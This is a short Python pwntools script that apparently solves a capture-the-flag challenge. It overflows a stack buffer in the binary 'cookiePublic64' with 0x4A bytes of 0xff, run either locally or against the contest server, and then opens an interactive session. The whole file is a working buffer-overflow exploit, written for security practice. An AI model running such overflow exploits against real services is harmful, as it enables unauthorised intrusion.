from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    buf = '\xff' * (0x48 + 2)
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc shell.angstromctf.com 1234'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./cookiePublic64'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
